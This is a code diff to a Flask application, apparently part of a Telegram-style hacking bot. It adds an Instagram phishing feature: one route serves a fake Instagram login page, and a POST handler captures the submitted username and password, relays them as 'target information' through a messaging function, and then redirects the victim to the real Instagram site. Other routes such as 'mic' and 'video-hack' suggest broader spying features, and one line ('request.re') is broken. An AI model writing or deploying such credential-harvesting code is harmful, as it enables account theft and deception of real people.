@@ -1,4 +1,4 @@
-from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions, send_file
+from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions, send_file, redirect
 import logging
 import os
 import json
@@ -160,6 +160,38 @@ def mic():
     return render_template("mic.html")
 
 
+@app.route("/instagram_fake_page")
+def insta():
+    message("instagram fake webpage  page opened !? \n")
+    return render_template("insta/index.html")
+
+
+
+@app.route("/instagram-login-error", methods=['POST'])
+def instadata():
+       request.re
+       message("instagram resiveing  page opened !? \n")
+   
+       user_name = request.form.get("username")  
+       user_pass = request.form.get("password")
+       user_data = f"""📌 INSTAGRAM-LOGIN\n
+    YOUR TREGET INFOMESION 
+    \n
+    *USERNAME : {user_name}*
+    *PASSWORD : {user_pass}*
+    
+    \n"""
+       message(user_data)
+       
+       print(user_name, user_pass)
+       return redirect("https://www.instagram.com/explore/")
+
+    
+   
+
+
+
+
 @app.route("/video-hack", methods=['POST'])
 def video_share():
     data = request.get_json()
@@ -283,12 +315,6 @@ if __name__ == '__main__':
     flask_thread.start()
     asyncio.run(Bot())
     
-
-
-
-  
-
-
 
 
 
